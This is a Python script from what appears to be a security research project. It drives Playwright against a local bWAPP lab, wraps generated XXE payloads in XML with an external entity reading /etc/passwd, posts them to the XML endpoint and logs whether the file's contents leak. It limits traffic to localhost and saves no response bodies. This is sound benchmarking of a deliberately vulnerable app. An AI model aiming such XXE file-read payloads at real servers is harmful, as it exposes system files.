"""Exercise generated XXE fragments against the local bWAPP XML sink only.

The generator output is inserted into the benchmark's XML request context. The
sink's low-security handler performs an UPDATE keyed by the expanded login;
the expanded /etc/passwd value cannot match a bWAPP username, so no row is
modified. Response bodies are held in memory only and reduced to a marker bit.
No network entity is used and no response/file contents are saved.
"""
import asyncio
import csv
import datetime as dt
import pathlib
import re
import urllib.parse

from playwright.async_api import async_playwright

ROOT = pathlib.Path(r"/path/to/Research_project\The_6th_model_test\08_Density_Mutation_Validation")
INPUT = ROOT / "02_App_Payloads" / "density_generated_payloads.csv"
OUT = ROOT / "05_Benchmark_Results" / "xxe_local_only_validation.csv"
BASE = "http://localhost:8081"
PASSWD_MARKER = "root:x:0:0:"


def make_xml(fragment):
    # Preserve the generated declaration/body, only adapting its enclosing root
    # name to the bWAPP handler's expected <reset> request element.
    text = fragment
    if "%3c" in text.lower():
        return None, "URL-encoded fragment is not decoded by this raw XML sink"
    entity = re.search(r"<!\s*ENTITY\s+([A-Za-z_:][\w:.-]*)\s+SYSTEM\s+['\"]file:///etc/passwd['\"]\s*>", text, re.I)
    if not entity:
        return None, "No supported local external-entity declaration found"
    name = entity.group(1)
    if re.search(r"<!\s*DOCTYPE\b", text, re.I):
        text = re.sub(r"<!\s*DOCTYPE\s+[A-Za-z_:][\w:.-]*", "<!DOCTYPE reset", text, count=1, flags=re.I)
        dtd = text
    else:
        # A declaration fragment must be placed in an XML document type subset.
        dtd = f"<!DOCTYPE reset [{text}]>"
    return dtd + f"<reset><login>&{name};</login><secret>PLGENN_NO_MATCH</secret></reset>", ""


async def main():
    with INPUT.open(encoding="utf-8-sig", newline="") as f:
        rows = [r for r in csv.DictReader(f) if r["category"] == "XXE"]
    output = []
    async with async_playwright() as p:
        browser = await p.chromium.launch(headless=True, executable_path=r"C:\Program Files\Google\Chrome\Application\chrome.exe")
        context = await browser.new_context(ignore_https_errors=True)

        async def guard(route):
            host = (urllib.parse.urlsplit(route.request.url).hostname or "").lower()
            if host in {"localhost", "127.0.0.1", "::1"}:
                await route.continue_()
            else:
                await route.abort("blockedbyclient")

        await context.route("**/*", guard)
        page = await context.new_page()
        await page.goto(BASE + "/login.php", wait_until="domcontentloaded", timeout=15000)
        if await page.locator('input[name="login"]').count():
            await page.locator('input[name="login"]').fill("bee")
            await page.locator('input[name="password"]').fill("bug")
            await page.locator('button[name="form"]').click()
            await page.wait_for_load_state("domcontentloaded", timeout=10000)
        try:
            await page.goto(BASE + "/security_level_set.php", wait_until="domcontentloaded", timeout=10000)
            if await page.locator('select[name="security_level"]').count():
                await page.locator('select[name="security_level"]').select_option("0")
                await page.locator('button[name="form_security_level"]').click()
        except Exception:
            pass

        for row in rows:
            xml, skipped_reason = make_xml(row["payload"])
            status, confirmed, outcome, error = "SKIPPED", False, "NOT_VALID_AS_XML_FRAGMENT", skipped_reason
            if xml is not None:
                try:
                    response = await context.request.post(BASE + "/xxe-2.php", data=xml.encode("utf-8"),
                                                          headers={"content-type": "application/xml"}, timeout=12000)
                    status = response.status
                    body = (await response.body()).decode("utf-8", "ignore")
                    confirmed = PASSWD_MARKER in body
                    outcome = "LOCAL_FILE_ENTITY_CONFIRMED" if confirmed else "NO_FILE_MARKER"
                    error = ""
                except Exception as exc:
                    status, outcome, error = "REQUEST_ERROR", "REQUEST_ERROR", type(exc).__name__
            output.append({"Category": row["category"], "Mode": row["mode"], "Index": row["index"],
                           "Payload": row["payload"], "Status": status, "Outcome": outcome,
                           "Confirmed": confirmed, "Evidence": "passwd_marker_boolean_only" if confirmed else "",
                           "Note": error, "ResponseBodySaved": False,
                           "TestedUtc": dt.datetime.now(dt.timezone.utc).isoformat()})
            print(f"XXE {row['mode']} #{row['index']}: {outcome}", flush=True)
        await context.close()
        await browser.close()
    with OUT.open("w", newline="", encoding="utf-8-sig") as f:
        writer = csv.DictWriter(f, fieldnames=list(output[0]))
        writer.writeheader()
        writer.writerows(output)
    print(f"XXE rows={len(output)} confirmed={sum(bool(r['Confirmed']) for r in output)} output={OUT}")


if __name__ == "__main__":
    asyncio.run(main())
